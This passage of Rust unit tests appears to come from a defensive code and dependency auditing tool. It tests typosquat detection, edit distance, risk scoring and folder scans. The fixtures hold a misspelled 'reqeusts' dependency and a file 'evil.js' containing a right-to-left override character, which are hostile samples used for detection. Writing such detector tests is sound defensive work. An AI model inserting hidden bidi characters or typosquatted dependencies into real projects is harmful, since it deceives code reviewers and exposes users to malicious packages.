        assert!(found.iter().all(|f| f.check == TYPOSQUAT));

        let reqs = "requests==2.31\nreqeusts\npython_dateutil\nscapy\n# numpi\n-r other.txt\n";
        let found = audit_file("requirements.txt", reqs.as_bytes());
        assert_eq!(found.len(), 1);
        assert_eq!(found[0].line, Some(2));
    }

    #[test]
    fn edit_distance_counts_swaps() {
        assert_eq!(edit_distance("react", "react"), 0);
        assert_eq!(edit_distance("react", "raect"), 1);
        assert_eq!(edit_distance("react", "reac"), 1);
        assert_eq!(edit_distance("react", "reaxt"), 1);
        assert_eq!(edit_distance("react", "rxxct"), 2);
    }

    #[test]
    fn scores_and_caps() {
        let many: Vec<Finding> = (0..300)
            .map(|i| {
                finding(
                    Severity::Low,
                    MINIFIED,
                    &format!("f{i}.js"),
                    None,
                    String::new(),
                )
            })
            .collect();
        let report = finish(300, many);
        assert_eq!(report.risk_score, 100);
        assert_eq!(report.total_findings, 300);
        assert!(report.truncated);
        assert_eq!(report.findings.len(), MAX_FINDINGS);
        assert!(report.has_at_least(Severity::Low));
        assert!(!report.has_at_least(Severity::Medium));
        assert_eq!(finish(0, vec![]).risk_level, "none");
    }

    #[test]
    fn audits_a_folder() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("src")).unwrap();
        fs::write(dir.path().join("src/main.rs"), "fn main() {}\n").unwrap();
        fs::write(dir.path().join("src/evil.js"), "x\u{202E}y\n").unwrap();
        let report = audit(dir.path(), None);
        assert_eq!(report.files_scanned, 2);
        assert_eq!(report.findings.len(), 1);
        assert_eq!(report.findings[0].file, "./src/evil.js");
        assert!(render_text(&report).contains("./src/evil.js:1"));
    }
}
